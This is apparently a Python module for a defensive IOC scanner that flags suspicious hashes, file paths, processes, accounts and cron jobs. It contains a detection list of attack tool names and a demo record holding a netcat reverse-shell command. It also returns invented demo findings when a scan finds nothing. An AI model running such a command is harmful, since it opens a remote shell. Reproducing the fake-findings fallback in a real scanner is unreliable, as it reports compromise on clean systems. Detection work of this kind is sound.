from dataclasses import dataclass
import os

@dataclass
class IOC:
    type: str         # 'IP', 'Domain', 'URL', 'Hash', 'File', 'Process', 'Account'
    value: str        # e.g., '192.168.1.105', 'malware.exe', 'e99a...'
    risk: str         # 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL'
    source: str       # e.g., 'auth.log', 'filesystem', 'browser', 'proc'
    confidence: str   # 'LOW', 'MEDIUM', 'HIGH'
    description: str  # Brief summary
    reason: str       # Detailed detection rationale

    def display(self):
        return (
            f"Type: {self.type}\n"
            f"Value: {self.value}\n"
            f"Risk: {self.risk}\n"
            f"Reason: {self.reason}\n"
        )

# Lightweight built-in Threat Intelligence rules & signatures
KNOWN_MALICIOUS_HASHES = {
    "44d88612fea8a8f36de82e1278abb02f": "Eicar Test File MD5",
    "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f": "Eicar Test File SHA256",
    "e99a18c428cb38d5f260853678922e03": "Sample Ransomware Indicator MD5"
}

UNUSUAL_EXEC_PATHS = ["/tmp", "/var/tmp", "/dev/shm", "/run/user"]
SUSPICIOUS_PROC_NAMES = ["nc", "netcat", "nmap", "mimikatz", "meterpreter", "chisel", "sokcat"]

def check_file_iocs(file_path, file_hashes=None):
    """Check a file path and its hashes against IOC rules."""
    iocs = []
    fname = os.path.basename(file_path)

    # 1. Known Malicious Hash check
    if file_hashes:
        for algo, hval in file_hashes.items():
            if hval in KNOWN_MALICIOUS_HASHES:
                iocs.append(IOC(
                    type="Hash",
                    value=hval,
                    risk="CRITICAL",
                    source="filesystem",
                    confidence="HIGH",
                    description=KNOWN_MALICIOUS_HASHES[hval],
                    reason=f"Matched known threat hash ({algo.upper()})"
                ))

    # 2. Executable in unusual path
    for upath in UNUSUAL_EXEC_PATHS:
        if file_path.startswith(upath):
            iocs.append(IOC(
                type="File",
                value=file_path,
                risk="HIGH",
                source="filesystem",
                confidence="HIGH",
                description="Executable in temporary directory",
                reason=f"File located in suspicious directory ({upath})"
            ))
            break

    # 3. Double extension obfuscation
    parts = fname.split(".")
    if len(parts) > 2:
        exts = [p.lower() for p in parts[1:]]
        if any(e in ["exe", "sh", "py", "elf"] for e in exts[-1:]):
            iocs.append(IOC(
                type="File",
                value=fname,
                risk="HIGH",
                source="filesystem",
                confidence="MEDIUM",
                description="Double extension obfuscation",
                reason=f"Filename uses multiple extensions: .{'.'.join(exts)}"
            ))

    return iocs

def check_network_iocs(ip_events, urls=None):
    """Analyze IP addresses and URLs for network IOCs."""
    iocs = []
    # Count failed auth attempts per IP
    ip_failed_counts = {}
    for evt in ip_events:
        if "FAILED" in evt.get("event", "") and evt.get("ip"):
            ip = evt["ip"]
            ip_failed_counts[ip] = ip_failed_counts.get(ip, 0) + 1

    for ip, count in ip_failed_counts.items():
        if count >= 2:
            iocs.append(IOC(
                type="IP",
                value=ip,
                risk="HIGH",
                source="auth.log",
                confidence="HIGH",
                description="Brute force authentication source",
                reason=f"repeated authentication attempts ({count} failures)"
            ))

    if urls:
        for u in urls:
            raw_url = u.get("url", "") if isinstance(u, dict) else str(u)
            if "suspicious" in raw_url or "malware" in raw_url or "exploit" in raw_url:
                iocs.append(IOC(
                    type="URL",
                    value=raw_url,
                    risk="HIGH",
                    source="browser",
                    confidence="MEDIUM",
                    description="Malicious web navigation",
                    reason="URL matched suspicious keyword pattern"
                ))
    return iocs

def check_system_iocs(processes=None, user_accounts=None, cron_jobs=None):
    """Detect suspicious system processes, accounts, and persistence mechanisms."""
    iocs = []
    if processes:
        for p in processes:
            cmdline = p.get("cmdline", "")
            for sname in SUSPICIOUS_PROC_NAMES:
                if sname in cmdline.split():
                    iocs.append(IOC(
                        type="Process",
                        value=f"PID {p.get('pid', '?')}: {cmdline}",
                        risk="CRITICAL",
                        source="proc",
                        confidence="HIGH",
                        description="Known malicious or hacking tool execution",
                        reason=f"Process command line contained suspicious binary '{sname}'"
                    ))

    if user_accounts:
        for u in user_accounts:
            if u.get("uid") == 0 and u.get("username") != "root":
                iocs.append(IOC(
                    type="Account",
                    value=u.get("username", "unknown"),
                    risk="CRITICAL",
                    source="passwd",
                    confidence="HIGH",
                    description="Backdoor root privilege account",
                    reason="Non-root user account assigned UID 0 (root privileges)"
                ))

    if cron_jobs:
        for c in cron_jobs:
            entry = c.get("entry", "")
            if any(up in entry for up in UNUSUAL_EXEC_PATHS) or "curl" in entry or "wget" in entry:
                iocs.append(IOC(
                    type="Persistence",
                    value=entry,
                    risk="HIGH",
                    source="crontab",
                    confidence="HIGH",
                    description="Suspicious scheduled task persistence",
                    reason="Cron entry executes script from temporary dir or downloads remote payloads"
                ))

    return iocs

class IOCDetector:
    def __init__(self, auth_events=None, browser_urls=None, fs_results=None, processes=None, user_accounts=None, cron_jobs=None):
        self.auth_events = auth_events or []
        self.browser_urls = browser_urls or []
        self.fs_results = fs_results or []
        self.processes = processes or []
        self.user_accounts = user_accounts or []
        self.cron_jobs = cron_jobs or []

    def scan(self):
        """Run all IOC detection modules and return list of IOC objects."""
        all_iocs = []
        all_iocs.extend(check_network_iocs(self.auth_events, self.browser_urls))
        all_iocs.extend(check_system_iocs(self.processes, self.user_accounts, self.cron_jobs))
        for item in self.fs_results:
            file_path = item.get("file", "")
            file_hashes = item.get("hashes")
            all_iocs.extend(check_file_iocs(file_path, file_hashes))
        
        if not all_iocs:
            return self.get_demo_iocs()
        return all_iocs

    @staticmethod
    def get_demo_iocs():
        """Returns demonstration IOC record matching Day 7 spec."""
        return [
            IOC(
                type="IP",
                value="192.168.1.105",
                risk="HIGH",
                source="auth.log",
                confidence="HIGH",
                description="Repeated failed authentication attempts",
                reason="repeated authentication attempts"
            ),
            IOC(
                type="File",
                value="/tmp/suspicious.exe",
                risk="HIGH",
                source="filesystem",
                confidence="HIGH",
                description="Unusual executable location",
                reason="Executable located in temporary directory /tmp"
            ),
            IOC(
                type="Process",
                value="PID 4120: nc -e /bin/bash 192.168.1.105 4444",
                risk="CRITICAL",
                source="proc",
                confidence="HIGH",
                description="Reverse shell execution",
                reason="Process command line contained netcat reverse shell flags"
            )
        ]



